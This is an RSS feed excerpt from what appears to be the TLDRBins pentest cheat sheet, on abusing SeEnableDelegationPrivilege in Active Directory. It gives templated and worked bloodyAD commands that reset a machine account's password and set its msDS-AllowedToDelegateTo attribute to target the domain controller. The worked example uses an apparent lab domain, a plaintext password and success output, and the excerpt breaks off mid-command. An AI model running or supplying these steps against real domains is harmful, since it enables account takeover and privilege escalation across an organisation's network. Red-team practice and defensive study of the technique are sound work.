channel.title: SeEnableDelegationPrivilege on TLDRBins
channel.description: Recent content in SeEnableDelegationPrivilege on TLDRBins

item.title: SeEnableDelegationPrivilege
item.description: Abuse #1: Constrained Delegation Linux Windows 1. Control of a Machine Account bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> set password '<TARGET_MACHINE>$' '<NEW_PASSWORD>' $ bloodyAD -d REDELEGATE.VL -u 'HELEN.FROST' -p 'Fall2024!' --host DC.REDELEGATE.VL set password 'FS01$' 'Fall2024!' [+] Password changed successfully! 2. Set msDS-AllowedToDelegateTo to Target SPN bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> set object 'CN=<TARGET_MACHINE>,CN=COMPUTERS,DC=<EXAMPLE>,DC=<COM>' 'msDS-AllowedToDelegateTo' -v 'ldap/<DC>' $ bloodyAD -u 'HELEN.FROST' -p 'Fall2024!' -d 'REDELEGATE.
